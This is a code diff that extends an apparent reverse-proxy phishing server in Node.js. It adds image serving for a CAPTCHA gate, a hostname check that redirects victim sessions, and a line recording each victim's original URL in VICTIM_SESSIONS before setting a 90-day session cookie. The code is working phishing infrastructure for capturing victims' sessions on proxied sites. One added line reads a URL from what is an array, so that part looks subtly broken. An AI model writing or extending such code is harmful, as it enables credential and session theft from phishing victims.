@@ -139,6 +139,21 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 //     console.log('[INCOMING COOKIE] (none)');
 // }
 
+// ---- Serve static images for CAPTCHA ----
+if (url.startsWith('/images/')) {
+    const imagePath = path.join(__dirname, url);
+    if (fs.existsSync(imagePath)) {
+        const ext = path.extname(imagePath);
+        const contentType = ext === '.svg' ? 'image/svg+xml' : 'image/png';
+        clientResponse.writeHead(200, { 'Content-Type': contentType });
+        fs.createReadStream(imagePath).pipe(clientResponse);
+        return;
+    }
+    clientResponse.writeHead(404);
+    clientResponse.end();
+    return;
+}
+
    // ---- CAPTCHA SUCCESS ROUTE ----
 if (url === '/captcha-success') {
     const session = getUserSession(headers.cookie);
@@ -216,6 +231,16 @@ if (url === '/captcha-success') {
         }
 
         else {
+            // ---- VALIDATE SESSION HOSTNAME ----
+if (currentSession) {
+    const sessionData = VICTIM_SESSIONS[currentSession];
+    if (!sessionData.hostname) {
+        console.log(`[PROXY] Session ${currentSession} has no hostname – redirecting to entry point`);
+        clientResponse.writeHead(302, { Location: PROXY_ENTRY_POINT });
+        clientResponse.end();
+        return;
+    }
+}        
             let clientRequestBody = [];
             clientRequest
                 .on("error", (error) => {
@@ -240,6 +265,8 @@ if (url === '/captcha-success') {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
                                         const { cookieName, cookieValue } = generateNewSession(phishedURL);
+                                        // ... set headers, etc.
+                                        VICTIM_SESSIONS[cookieName].originalUrl = clientRequestBody.url; // <-- ADD THIS LINE
                                         const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                                         clientResponse.setHeader("Set-Cookie", cookieHeader);
                                        // console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);
